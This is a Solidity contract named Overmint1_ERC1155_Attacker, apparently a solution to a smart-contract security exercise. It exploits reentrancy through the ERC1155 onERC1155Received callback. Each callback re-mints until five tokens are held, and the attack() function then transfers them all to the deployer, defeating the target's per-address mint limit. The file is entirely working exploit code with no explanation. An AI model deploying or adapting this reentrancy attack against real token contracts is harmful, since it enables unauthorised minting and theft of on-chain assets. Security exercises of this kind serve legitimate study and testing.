// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "./Overmint1-ERC1155.sol";

contract Overmint1_ERC1155_Attacker is ERC1155Holder {
    using Address for address;

    address private targetContract;
    address private tokenReceiver;
    uint256 private id = 0;

    constructor(address _targetContract) {
        targetContract = _targetContract;
        tokenReceiver = msg.sender;
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory) public override returns (bytes4) {
        Overmint1_ERC1155 token = Overmint1_ERC1155(targetContract);
        if (token.balanceOf(address(this), id) < 5) {
            token.mint(id, "");
        }
        return super.onERC1155Received.selector;
    }

    function attack() public {
        Overmint1_ERC1155 token = Overmint1_ERC1155(targetContract);
        token.mint(id, "");
        token.safeTransferFrom(address(this), tokenReceiver, id, 5, "");
    }
}
